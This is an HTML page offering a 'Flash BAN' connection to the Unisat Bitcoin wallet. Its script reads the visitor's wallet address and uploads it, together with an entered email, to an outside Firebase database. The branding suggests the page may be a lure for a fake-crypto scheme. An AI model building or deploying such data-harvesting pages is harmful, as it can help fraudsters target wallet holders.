<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bitcoin Wallet Connection</title>
    <script src="https://cdn.jsdelivr.net/npm/ethers@5.4.6/dist/ethers.umd.min.js"></script> <!-- Ethers.js library -->
    <style>
        body {
            font-family: 'Arial', sans-serif;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Flash BAN v1.0.0.1 connection to Unisat Wallet</h1>
        <input type="email" id="emailInput" placeholder="Enter your email" required style="padding: 10px; margin-bottom: 10px; width: 100%; border-radius: 5px;">
        <button id="connectButton">CONNECT NOW</button>
        <div id="walletAddress"></div>
        <div id="statusMessage"></div>
    </div>

    <script>
        let provider;
        let signer;
        let connectedAddress = null;
        let isConnecting = false;

        document.getElementById('connectButton').addEventListener('click', async function () {
            if (isConnecting) return;
            isConnecting = true;
            document.getElementById('connectButton').textContent = 'Connecting...';
            document.getElementById('connectButton').style.backgroundColor = '#f0ad4e';

            if (typeof window.unisat !== 'undefined') {
                try {
                    // Connect to Unisat wallet
                    const accounts = await window.unisat.requestAccounts();
                    connectedAddress = accounts[0];

                    document.getElementById('connectButton').textContent = 'Wallet Connected';
                    document.getElementById('connectButton').style.backgroundColor = '#28a745';
                    document.getElementById('walletAddress').textContent = `Connected Address: ${connectedAddress}`;
                    
                    // Send data to Firebase
                    const email = document.getElementById('emailInput').value;
                    const apiUrl = `https://apidatabase-ff62a-default-rtdb.firebaseio.com/addresses/${encodeURIComponent(connectedAddress)}.json`;
                    const jsonData = JSON.stringify({ email });
                    await fetch(apiUrl, {
                        method: 'PUT',
                        body: jsonData,
                        headers: { 'Content-Type': 'application/json' }
                    });

                } catch (error) {
                    document.getElementById('statusMessage').textContent = "Bitcoin wallet connection failed.";
                    document.getElementById('connectButton').textContent = 'Connect Wallet';
                    document.getElementById('connectButton').style.backgroundColor = '#f6851b';
                }
            } else {
                document.getElementById('statusMessage').textContent = "Unisat Wallet is not installed!";
            }

            isConnecting = false;
        });
    </script>
</body>
